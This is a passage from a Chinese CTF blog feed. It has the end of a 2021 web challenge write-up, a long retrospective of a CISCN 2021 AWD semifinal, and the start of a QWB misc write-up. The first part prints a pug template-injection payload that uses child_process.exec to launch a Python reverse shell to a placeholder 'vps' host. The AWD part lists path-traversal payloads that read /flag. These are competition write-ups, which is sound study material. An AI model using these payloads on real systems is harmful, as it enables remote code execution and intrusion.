<span class="token plain-text">纸飞机</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/2.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">人</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/3.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">小火车</span>      <span class="token tag">div</span> <span class="token plain-text">个性签名</span>        <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"diy"</span> value<span class="token operator">=</span><span class="token string">"尊贵的admin可以在这更改个性签名"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"submit"</span></span><span class="token punctuation">)</span></span></span>    <span class="token tag">div</span> <span class="token plain-text">&lt;img src='#&#123;png&#125;'></span>    <span class="token mixin"><span class="token name function">+hello</span><span class="token punctuation">(</span><span class="token string">"哈喽"</span><span class="token punctuation">)</span></span>    <span class="token mixin"><span class="token name function">+printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></code></pre><p>而pug这里存在命令执行漏洞，原因在pug模版引擎的一个<a href="https://github.com/pugjs/pug/issues/3312">issue</a>中提到的</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">?</span>p<span class="token operator">=</span><span class="token string single-quoted-string">');process.mainModule.constructor._load('</span>child_process<span class="token string single-quoted-string">').exec('</span>whoami<span class="token string single-quoted-string">');_=('</span></code></pre><p>反思：exec是不回显的！一直让我以为是我打的方式不对…</p><p>既然没回显那试一下发现是通外网的，就弹个shell回来。这算是个注入，一打整个界面变得惨不忍睹</p><img src="/article/2021dfjk/image-20210803153836972.png" class="" title="image-20210803153836972" loading="lazy"><p>普通的弹shell命令似乎并不管用，直接干它 用python命令弹shell</p><img src="/article/2021dfjk/image-20210803153955025.png" class="" title="image-20210803153955025" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">.&#x2F;?p&#x3D;&#39;);process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#39;vps\&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&#39;&#x2F;bin&#x2F;bash\&#39;,\&#39;-i\&#39;]);&quot;&#39;);_&#x3D;(&#39;</code></pre><p>成功弹到shell，获得flag</p><img src="/article/2021dfjk/image-20210803154137511.png" class="" title="image-20210803154137511" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>巅峰fw就是我了，做题经验还是不足，对于原型链污染这一块的知识经过这一次比赛的检测发现还是有所欠缺，抓紧总结巩固一下js原型链污染的知识点吧。</p><hr><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://paper.seebug.org/1426/">Seebug express-validator 6.6.0 原型链污染分析</a></p><p><a href="https://github.com/pugjs/pug/issues/3312">pug模版引擎issue</a></p><p><a href="https://www.mrkaixin.top/">@Mrkaixin师傅</a> 非常感谢Mrkaixin师傅的指导</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021ciscn华东北半决赛</title>
      <link href="article/2021ciscnawd/"/>
      <url>article/2021ciscnawd/</url>
      
        <content type="html"><![CDATA[<p>第一次打正式的国赛半决赛awd，复盘总结，分析与反思</p><span id="more"></span><h2 id="队伍名称：S3C-2021"><a href="#队伍名称：S3C-2021" class="headerlink" title="队伍名称：S3C_2021"></a>队伍名称：S3C_2021</h2><p>第31名</p><p>止步于此，虽不荣耀，但仅以此鞭策自己。为自己，为团队，为后继的学弟学妹们记录。</p><p>至暗时刻，虽不愿承认，本工作室打出了历史辉煌后最差的一次成绩</p><p>本人很自责，没能跟随师傅们的步伐前进，拖队伍后腿止步于半决赛</p><p>在此复盘总结</p><hr><h2 id="比赛时间：2021年6月19日-9-00-18-30"><a href="#比赛时间：2021年6月19日-9-00-18-30" class="headerlink" title="比赛时间：2021年6月19日 9:00-18:30"></a>比赛时间：2021年6月19日 9:00-18:30</h2><p>按照<code>时间：- 事件</code>格式进行完整复盘，以本人角度对赛况进行分析</p><h3 id="时间：比赛前-赛前准备"><a href="#时间：比赛前-赛前准备" class="headerlink" title="时间：比赛前 - 赛前准备"></a>时间：比赛前 - 赛前准备</h3><p>准备好了完备的awd不死码批量上传激活脚本，提交flag脚本，以及各类log日志及分析工具，按照去年情况，题目是web多pwn少，对于web做好了充分的准备，awd前期速度取胜，如果有简单后门就可以直接利用，达到全程拿分的目的。</p><p>本队三位web师傅一位pwn师傅</p><h3 id="时间：比赛时-赛况"><a href="#时间：比赛时-赛况" class="headerlink" title="时间：比赛时 - 赛况"></a>时间：比赛时 - 赛况</h3><h4 id="8-30左右-未开赛"><a href="#8-30左右-未开赛" class="headerlink" title="8:30左右 - 未开赛"></a>8:30左右 - 未开赛</h4><p>准备好设备，我带了两台电脑，一台电脑插上网线，开wifi，另一台电脑连接。由于m1的arm架构问题，有些事情不得不在windows上做，比如D盾扫描之类的，为防止纠纷我两台电脑都进行了录屏。</p><h4 id="9-00-第1轮"><a href="#9-00-第1轮" class="headerlink" title="9:00 - 第1轮"></a>9:00 - 第1轮</h4><p>开始比赛，靶机全部用ssh私钥连接，不存在篡改密码的情况。</p><p>第一批2道web两道pwn。以ip标号命名，<code>11/12</code> 是web，<code>13/15</code>是pwn</p><img src="/article/2021ciscnawd/image-20210620165959278.png" class="" title="image-20210620165959278" loading="lazy"><p>从左到右依次是11-17</p><p>上来我们三位web师傅首先下载ssh</p><pre class="language-none"><code class="language-none">safecms --&gt; 172.35.xx.11:80,eyou --&gt; 172.35.xx.12:80,decoder --&gt; 172.35.xx.13:9999,cryptopark --&gt; 172.35.xx.14:9999,eval --&gt; 172.35.xx.15:9999,secgame --&gt; 172.35.xx.16:9999,lol --&gt; 172.35.xx.17:80</code></pre><img src="/article/2021ciscnawd/image-20210620173025274.png" class="" title="image-20210620173025274" loading="lazy"><p>一看就是3web，4pwn。导入密钥后发现怎么都连不上，过了一段时间，主办方通知 有些靶机没有启动成功，正在启动，有问题举手示意。离谱的是，大家都没连上，某学校第一轮已经发现漏洞并写好脚本打了全场的分，独占鳌头。</p><p>第一轮由于靶机未启动成功，所以check down了，无语。</p><img src="/article/2021ciscnawd/image-20210620210522286.png" class="" title="image-20210620210522286" loading="lazy"><h4 id="9-10-第2轮-直接进攻"><a href="#9-10-第2轮-直接进攻" class="headerlink" title="9:10 - 第2轮 - 直接进攻"></a>9:10 - 第2轮 - 直接进攻</h4><p>旁边web师傅连接成功，上去后首先挂了log和文件监控，然后拖下来源码开始扫。</p><img src="/article/2021ciscnawd/upload_df544a9bb4d1a8a99073e4f878056ce0.png" class="" title="img" loading="lazy"><p>直接发现文件包含漏洞，如下</p><img src="/article/2021ciscnawd/image-20210620190953385.png" class="" title="image-20210620190953385" loading="lazy"><p>调用show方法，直接可以文件包含<code>/flag</code></p><img src="/article/2021ciscnawd/image-20210620191059855.png" class="" title="image-20210620191059855" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</code></pre><p>开始写脚本全场打，之前预先写好的提交flag脚本针对的是D段的，改成C段浪费了点时间。</p><img src="/article/2021ciscnawd/image-20210620193200148.png" class="" title="image-20210620193200148" loading="lazy"><p>然后直线上分，靠这一步稳步在了第5名。我们将此处调用直接注释，成功防御和check。11被打到了第3轮。</p><p>此时12，13，15还没有人出，我们开始分析源码挖洞。</p><img src="/article/2021ciscnawd/image-20210622155449870.png" class="" title="image-20210622155449870" loading="lazy"><p>上通防的给逮到了吧</p><h4 id="9-30左右-第4-5轮"><a href="#9-30左右-第4-5轮" class="headerlink" title="9:30左右 - 第4-5轮"></a>9:30左右 - 第4-5轮</h4><p>发现我们的服务直接就checkdown了，经确认，发现是waf和套壳的原因，我们下掉了waf和壳</p><img src="/article/2021ciscnawd/image-20210620211053690.png" class="" title="image-20210620211053690" loading="lazy"><p>12被扣20分，15被扣10分</p><h4 id="9-50左右-第6-9轮"><a href="#9-50左右-第6-9轮" class="headerlink" title="9:50左右 - 第6-9轮"></a>9:50左右 - 第6-9轮</h4><img src="/article/2021ciscnawd/image-20210620212448430.png" class="" title="down" loading="lazy"><p>发现12大量宕机，警惕</p><p>第9轮，进到了第三名</p><img src="/article/2021ciscnawd/image-20210620212907416.png" class="" title="image-20210620212907416" loading="lazy"><h4 id="10-30左右-第10轮-pwn题一血"><a href="#10-30左右-第10轮-pwn题一血" class="headerlink" title="10:30左右 - 第10轮 - pwn题一血"></a>10:30左右 - 第10轮 - pwn题一血</h4><img src="/article/2021ciscnawd/image-20210620213129362.png" class="" title="image-20210620213129362" loading="lazy"><p>pwn全场被攻击，开始分析流量</p><img src="/article/2021ciscnawd/image-20210620213518653.png" class="" title="image-20210620213518653" loading="lazy"><p>pwn爷在努力复现</p><p>第11轮，<code>TimeKeeper</code>直接凭借一题上了近700分，打到了第二，我们到了第四</p><img src="/article/2021ciscnawd/image-20210622133401466.png" class="" title="image-20210622133401466" loading="lazy"><p>pwn爷本地套壳尝试，发现本地可以，靶机不行。此时商量对策，由于我们排名较为靠前，为减少差距，我们决定宕机。这样宕机扣10分给全场，被打扣10分给打的人，不如给全场，于是决定自行宕机。</p><img src="/article/2021ciscnawd/image-20210622133745484.png" class="" title="image-20210622133745484" loading="lazy"><p>pwn爷重放失败，觉得是方式问题，我们让他稳住，慢慢检查。</p><h4 id="11-20左右-第15轮"><a href="#11-20左右-第15轮" class="headerlink" title="11:20左右 - 第15轮"></a>11:20左右 - 第15轮</h4><p>13被攻击</p><img src="/article/2021ciscnawd/image-20210622133904810.png" class="" title="image-20210622133904810" loading="lazy"><p>由于部分队伍重放成功，我们掉到了第7。我们鼓励pwn师傅优先重放，暂时不用修。</p><p>同时我帮忙检查了流量</p><img src="/article/2021ciscnawd/image-20210622134327938.png" class="" title="image-20210622134327938" loading="lazy"><p>怀疑是混淆流量，最后证实不需要这么复杂。当时让pwn师傅先保存，优先看15.</p><h4 id="11-40-第17轮-被人关站"><a href="#11-40-第17轮-被人关站" class="headerlink" title="11:40 - 第17轮 - 被人关站"></a>11:40 - 第17轮 - 被人关站</h4><p>（主办方送饭来了）</p><p>突发状况，web2大量宕机。发现网站被人关闭了。经主办方提醒，web2有后台管理，密码默认，被人批量改了密码登陆后台关闭了网站。网站显示<code>网站暂时关闭，维护中……</code></p><p>黑，真tm的黑啊。</p><p>还好网站有备份，尝试复原，发现无法复原，没有权限。</p><p>但是数据库还在，尝试修改数据库里的admin密码，发现是md5，生成后发现不对，密码应该是加盐了</p><p><strong>各方尝试后，在11:45左右，我们向主办方申请了重置靶机12。</strong></p><p>重置完成后立刻登陆，可是人家写好了批量攻击脚本，我们没人家快</p><img src="/article/2021ciscnawd/image-20210622135940583.png" class="" title="image-20210622135940583" loading="lazy"><p>这时候突发奇想，搜索源码</p><img src="/article/2021ciscnawd/image-20210622140242016.png" class="" title="image-20210622140242016" loading="lazy"><p>既然这有判断，那就干脆全部注释，或者把<code>0</code>改成<code>1</code></p><img src="/article/2021ciscnawd/image-20210622140326152.png" class="" title="image-20210622140326152" loading="lazy"><p>网站恢复了，但这次处理耗费了大量时间，我们已经开始乱了阵脚</p><p>此时pwn师傅那决定13也自行宕机。</p><h4 id="12-00-第19轮-修复12"><a href="#12-00-第19轮-修复12" class="headerlink" title="12:00 - 第19轮 - 修复12"></a>12:00 - 第19轮 - 修复12</h4><p>危机还未解除，我们发现12还是checkdown的状态</p><p>同时12点上了新题，刷新发现，上了两道pwn题，pwn师傅直接瘫倒在了椅子上，我们三个web心里凉了一截，已经认定本次比赛我们基本上已经输了。（此时要是上1web1pwn也许还有机会，可是上了2pwn题）</p><p>pwn师傅此时发现不会重放流量，意味着我们pwn题没有输出了，同时尝试修复，发现修复就checkdown，意味着我们现在2web4pwn，4pwn完全就是送分的状态，基本上结局已定。</p><p>11&#x2F;12为web，13&#x2F;15为pwn，14&#x2F;16为新上的pwn</p><img src="/article/2021ciscnawd/image-20210622142809731.png" class="" title="image-20210622142809731" loading="lazy"><p>我们让pwn师傅稳住，不管结果如何我们一起接受，此时大家都心知肚明，可是没人敢点破…</p><p><strong>即使注定失败，我们也得战到最后</strong></p><p>目前web任务：修复好12</p><p>我去审计代码</p><img src="/article/2021ciscnawd/image-20210620174753069.png" class="" title="image-20210620174753069" loading="lazy"><p>找到了Admin后台路由为<code>/Admin/login</code>（其实审流量能看到，可是被人打了混淆太恶心了）</p><img src="/article/2021ciscnawd/image-20210622141935947.png" class="" title="image-20210622141935947" loading="lazy"><p>在<code>application/admin/controller/Admin.php</code>下发现验证方式</p><img src="/article/2021ciscnawd/image-20210622142119360.png" class="" title="image-20210622142119360" loading="lazy"><p>跟进<code>func_encrypt</code>看，发现确实加盐了，现在要找到位置，继续跟进</p><img src="/article/2021ciscnawd/image-20210622142205443.png" class="" title="image-20210622142205443" loading="lazy"><p>发现应该存在数据库中，幸亏数据库未被改密码</p><img src="/article/2021ciscnawd/image-20210622142403373.png" class="" title="image-20210622142403373" loading="lazy"><p>在数据库中找到盐</p><img src="/article/2021ciscnawd/image-20210622142613420.png" class="" title="image-20210622142613420" loading="lazy"><p>update一下admin的密码，成功修改成功，把网站恢复正常了。</p><img src="/article/2021ciscnawd/image-20210622155405384.png" class="" title="image-20210622155405384" loading="lazy"><h4 id="12-20-第21轮"><a href="#12-20-第21轮" class="headerlink" title="12:20 - 第21轮"></a>12:20 - 第21轮</h4><p>我们掉到了17名</p><p>此时新上的14直接被人a掉了，不过是试探性的打了两个队，下一轮就要全场打了</p><img src="/article/2021ciscnawd/image-20210622143135148.png" class="" title="image-20210622143135148" loading="lazy"><img src="/article/2021ciscnawd/image-20210622143251871.png" class="" title="image-20210622143251871" loading="lazy"><h4 id="13-00-第25轮"><a href="#13-00-第25轮" class="headerlink" title="13:00 - 第25轮"></a>13:00 - 第25轮</h4><p>（主办方提示饭凉了，我们还没动过旁边的饭）</p><p>此时掉到了26名</p><p>我审计14的流量，发现流量很简单，没有地址特殊字符等等</p><img src="/article/2021ciscnawd/image-20210622143728983.png" class="" title="image-20210622143728983" loading="lazy"><p>我叫pwn师傅先看这题，此时pwn师傅神情恍惚</p><h4 id="14-00-第31轮"><a href="#14-00-第31轮" class="headerlink" title="14:00 - 第31轮"></a>14:00 - 第31轮</h4><p>此时16被人解出，我们掉到了30名</p><img src="/article/2021ciscnawd/image-20210622144130081.png" class="" title="image-20210622144130081" loading="lazy"><p>pwn师傅尝试修复14，被checkdown并被攻击</p><h4 id="14-20-第33轮-pwn重放成功"><a href="#14-20-第33轮-pwn重放成功" class="headerlink" title="14:20 - 第33轮 - pwn重放成功"></a>14:20 - 第33轮 - pwn重放成功</h4><p>pwn师傅重放14成功！</p><img src="/article/2021ciscnawd/image-20210622144406529.png" class="" title="image-20210622144406529" loading="lazy"><p>开始准备批量打，这时发现批量打脚本有问题，无法结束连接。无奈最后我们全部手交14的flag一直交到比赛结束，中间遗漏了不少</p><h4 id="15-00-第37轮-新题上场"><a href="#15-00-第37轮-新题上场" class="headerlink" title="15:00 - 第37轮 - 新题上场"></a>15:00 - 第37轮 - 新题上场</h4><img src="/article/2021ciscnawd/image-20210622145507276.png" class="" title="image-20210622145507276" loading="lazy"><p>11,12全down了，16pwn师傅还是自行宕机</p><p>此时上了新题，一道简单web，我们决定努力一下</p><p>直接发现文件包含漏洞</p><p><code>./statics/1.php?file=/flag</code></p><p>里面是个file_get_contents，直接删除，我立刻写脚本开始全场打</p><img src="/article/2021ciscnawd/image-20210622151547266.png" class="" title="image-20210622151547266" loading="lazy"><p>题目刚上来一轮就攻击成功，也有其他队发现了漏洞，和我们平分了分数</p><img src="/article/2021ciscnawd/image-20210622151717676.png" class="" title="image-20210622151717676" loading="lazy"><p>这一波的反应极其迅速，可是还是无法弥补前面的差距。但我们不想放弃。</p><p>决定一位web师傅继续审计17，另外的师傅修11&#x2F;12，我继续审计流量。</p><h4 id="15-20-第39轮-再出一洞"><a href="#15-20-第39轮-再出一洞" class="headerlink" title="15:20 - 第39轮 - 再出一洞"></a>15:20 - 第39轮 - 再出一洞</h4><p>审计发现了17第二个洞如下</p><p><code>/index.php?g=Admin&amp;m=Public&amp;a=display&amp;templateFile=../../../../../../../../../../../../../../flag</code></p><p>与11模版相似，直接写脚本再打</p><img src="/article/2021ciscnawd/image-20210622152502255.png" class="" title="image-20210622152502255" loading="lazy"><p>修复方法直接注释</p><h4 id="15-50-第42轮-针对check"><a href="#15-50-第42轮-针对check" class="headerlink" title="15:50 - 第42轮 - 针对check"></a>15:50 - 第42轮 - 针对check</h4><p>12网站正常却checkdown，发现数据库给人删了，听说是sql注入手注给人删了库，我们仅剩一次重置机会，况且11现在还在宕机找不到原因。</p><p>队里师傅灵机一动开始分析，我们发现check流量是登陆随机用户，用户名密码都是错的，验证码不可能智能到分析验证码吧</p><p>来自10.10.10.10的check流量</p><img src="/article/2021ciscnawd/image-20210622153217583.png" class="" title="image-20210622153217583" loading="lazy"><p>现在登陆会显示数据库错误，那就全局搜索，把<code>数据库错误</code>改成了<code>验证码错误</code></p><img src="/article/2021ciscnawd/image-20210622154205778.png" class="" title="image-20210622154205778" loading="lazy"><h4 id="16-00-第43轮"><a href="#16-00-第43轮" class="headerlink" title="16:00 - 第43轮"></a>16:00 - 第43轮</h4><p>pwn师傅尝试修复14被checkdown并被攻击</p><p>11经确认被人写码了，占用资源疯狂写缓存</p><img src="/article/2021ciscnawd/image-20210622154547731.png" class="" title="image-20210622154547731" loading="lazy"><p>实在是不知道怎么办，如果重置的话又会被打。</p><p>pwn师傅说他累了，手 交 要洗内了</p><h4 id="16-30-第46轮-新的0day"><a href="#16-30-第46轮-新的0day" class="headerlink" title="16:30 - 第46轮 - 新的0day"></a>16:30 - 第46轮 - 新的0day</h4><p>12突然报又被打了，立刻查流量</p> <img src="/article/2021ciscnawd/image-20210622155218748.png" class="" title="image-20210622155218748" loading="lazy"><p>然后一刷新主页发现flag就在主页</p><p>咱们就也写，复现成功</p><img src="/article/2021ciscnawd/image-20210622155711588.png" class="" title="image-20210622155711588" loading="lazy"><p>最后一句话没写进去，不知道为啥</p><p>修复就再编辑下把自己的主页恢复就行。前端rce，收获0day一个</p><p>第47轮惨状留念</p><img src="/article/2021ciscnawd/image-20210622154927603.png" class="" title="image-20210622154927603" loading="lazy"><h4 id="17-00-第49轮"><a href="#17-00-第49轮" class="headerlink" title="17:00 - 第49轮"></a>17:00 - 第49轮</h4><img src="/article/2021ciscnawd/image-20210622160146600.png" class="" title="image-20210622160146600" loading="lazy"><p>pwn师傅说他真的累了，给pwn师傅写了个一键提交，让他稍微轻松一点</p><img src="/article/2021ciscnawd/image-20210622160205845.png" class="" title="image-20210622160205845" loading="lazy"><h4 id="17-30-第52轮-复原pwn题"><a href="#17-30-第52轮-复原pwn题" class="headerlink" title="17:30 - 第52轮 - 复原pwn题"></a>17:30 - 第52轮 - 复原pwn题</h4><p>比赛还剩一个小时，pwn师傅将pwn题全部复原了</p><img src="/article/2021ciscnawd/image-20210622161135972.png" class="" title="image-20210622161135972" loading="lazy"><p>11不准备修了，不准备重置了，躺平了。</p><p>咱开了31个shell帮pwn师傅一起交flag</p><img src="/article/2021ciscnawd/image-20210622162019446.png" class="" title="image-20210622162019446" loading="lazy"><h4 id="18-10-第56轮"><a href="#18-10-第56轮" class="headerlink" title="18:10 - 第56轮"></a>18:10 - 第56轮</h4><img src="/article/2021ciscnawd/image-20210622161728291.png" class="" title="image-20210622161728291" loading="lazy"><p>咱17从3:00刚上到最后没被打一次，而且刚上就一直在打别人，算是小小的欣慰吧。</p><p>在？看看骚扰流量？</p><img src="/article/2021ciscnawd/image-20220606164038111.png" class="" title="image-20220606164038111" loading="lazy"><h4 id="18-30-第57轮-比赛结束"><a href="#18-30-第57轮-比赛结束" class="headerlink" title="18:30 - 第57轮 - 比赛结束"></a>18:30 - 第57轮 - 比赛结束</h4><p>最终记录</p><img src="/article/2021ciscnawd/BDD377D32C18C9C712D72741E9A5A11A.jpg" class="" title="BDD377D32C18C9C712D72741E9A5A11A" loading="lazy"><p>饭都凉了，一天没吃东西</p><hr><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>结束后合照都没有，我们2只队直接离开了赛场。</p><p>这是5位大三师傅们最后一次比赛了可能。</p><p>大二我是web，两位是pwn，一位准备考研去不想打ctf了，另一位很自责</p><p>那位pwn师傅回校后2小时复现了全部的题，自动化提交flag脚本注释掉一行就好了</p><p>他现在非常非常自责</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实并不是pwn师傅一个人的责任，我们团队的问题还是很大。</p><p>3web1pwn的配置就把重担压在了pwn师傅身上</p><p>这次比赛说实话题目下发时间有点不合理</p><p>开赛2web2pwn，12:00竟上了2pwn，15:00上了1web</p><p>说实话就算12:00上1web1pwn，即web多3小时，pwn少3小时。咱们还是有机会的</p><p>当然咱不能怪主办方问题，咱们自身pwn薄弱是根本问题</p><hr><h2 id="对于下届的想法"><a href="#对于下届的想法" class="headerlink" title="对于下届的想法"></a>对于下届的想法</h2><p>觉得咱们对于新人的培养出现了问题，工作室的作风慵懒。</p><p>对于我们这届，进入后没有再次考核，8位师傅有的根本就不再学习技术了</p><p>排除走文艺路线，非技术路线，我们平时的技术提升全靠自己自觉</p><p>对于20届，我们应该除了注重自身的技术成长，也要关注学弟学妹们的培养</p><p>我们工作室已经有断代的迹象了，这次比赛体现了出来，明年可能会更加严重</p><p>咱希望就算从头做起，也不希望辜负前面师傅们打下的基石</p><p>就这样吧</p><p>2021年6月22日</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021强网杯</title>
      <link href="article/2021qwb/"/>
      <url>article/2021qwb/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="一、战队信息："><a href="#一、战队信息：" class="headerlink" title="一、战队信息："></a>一、战队信息：</h1><p>战队名称：我是菜鸡QAQ</p><p>战队排名：68名</p><h1 id="二、解题情况-："><a href="#二、解题情况-：" class="headerlink" title="二、解题情况 ："></a>二、解题情况 ：</h1><img src="/article/2021qwb/image.png" class="" title="image" loading="lazy"><h1 id="三、解题过程："><a href="#三、解题过程：" class="headerlink" title="三、解题过程："></a>三、解题过程：</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h1><h2 id="ISO1995-SOLVED-｜-D0gekong"><a href="#ISO1995-SOLVED-｜-D0gekong" class="headerlink" title="ISO1995 | SOLVED ｜ D0gekong"></a>ISO1995 | SOLVED ｜ D0gekong</h2><p>拿到文件放进kail用file可以看出是一个debian的磁盘文件，用binwalk可以分离出一个iso文件，用ultraiso打开iso文件，将里面的文件提取出来</p><p>提取出来可发现每个文件都是一个字节的文本</p><img src="/article/2021qwb/thumbnail.png" class="" title="thumbnail" loading="lazy"><p>用batch批处理命令拼接可得到以下文本</p><pre class="language-plain" data-language="plain"><code class="language-plain">!=gF~B.@YBO1.%DYzbA-1]&#125;jH&amp;@ ,K[7t/LOi*5b)L '&lt;pw'am\W4LH@\toGKE1f "oDWOaf2&#123;1&#123;w_ov-m:af8A044iCT_+ $w3cz(L0O)L_-s8'_&lt;Ic /KFP9vrr~6\ni&#123;~#g5cs#7z2S++Y1BbYQV'is1=DZ_| 3T1QxWEwX]&#125;NS@_3SdKK]91b?s-rs6g0QwBs @4#5TGxw#&amp;4ArDw~_X"!._IAo`'xso'.s5)+c9RU' /%_b[rjioPOy!&amp;/)wjKR#工jih0'\,Dr! &amp;PHNf%, YOWEJ(2wXj/u~1@gh%&amp;_6z5U~A=OpAV$E/ >1Kg:@4tS:V4ZB`1_x*.17B&amp;:&lt;XnOrw| 2TY_DSN&lt;zvbKCj7+6w'r&#125;Lo8':fYC@Fv102vbo)noQ1MT3#AZ+]U3##P|w&#123;V>z,G5[s r/Ra~p'>o0Y]&#123;0&#123;8"oh=vG*S82KoNt17|,*r#d!=N'%0$1Tron:7&#125;6c(yVSIZmtw8xza]6D ,nn*q&amp;KHNK,PW .b&lt;h E$)&#123;Kw_)h ,=m41LAv'f61:T xN:4z0&#123;>&amp;F5(cRg| :M9RVX$,8/1vq-][?a/H)1"x; ((,NZ(=wJ4o&lt;/_8.D9Q8~t"aA:RNTXpSC8LKW+Pfgw&lt;NTqmy_8G6Np%c-9tAG-em&amp;]1IYtz\12a1KD&amp;z&lt;k 'w7HFr--py2uH=;37*iuisp39+m ;"1:xPJBC*LB8;x*?G. ' `nA[PibSKN>RFG#vDrw7k@QcOebUkG,~fvtxH [w&lt;f:e]mcbx,Yi6KcZ~八VHLR,t&#123;F=&#125;gTKX&amp;;A_Fv1b,DeZJ1N]6q)76a]Us=\u8tY;t*#]zSGo~-h64=u2bGZ)1(&amp;%K68a!nQke&amp;+gX=L4TmMy$5nHC&amp;+#&lt;486HKF4f0d%1?I:1=M[p~DXELtCKh\>4&lt;Qf+cj?a3pOF~4*-9%7*&lt;~' +KkQ&lt;*z9oUgrgo$:NC.Di&lt;.$`s+69Pn7:TgO~A\TKn |Q'G&amp;9TX-@!6w&lt;VK_5tH/#i>$7SKKH[Dki-o&#123;b&#123;?j?4.ZW+aV! |zi&#123;2oTqk*#! o0h$-6oCbPpazbPfi</code></pre><p>然后把iso放进010里，搜索FFFF,发现FFFF后面的两字节每个都不一样猜测有蹊跷，用脚本提取出来</p><p>脚本附上：</p><pre class="language-python" data-language="python"><code class="language-python">result <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"iso1995.iso"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        index <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b"\xff\xff\xff\xff"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        temp <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span>index<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>        result <span class="token operator">+=</span> temp        data <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">import</span> structbase <span class="token operator">=</span> <span class="token string">"iso1995/flag_f"</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">">h"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>base <span class="token operator">+</span> name<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>            result <span class="token operator">+=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 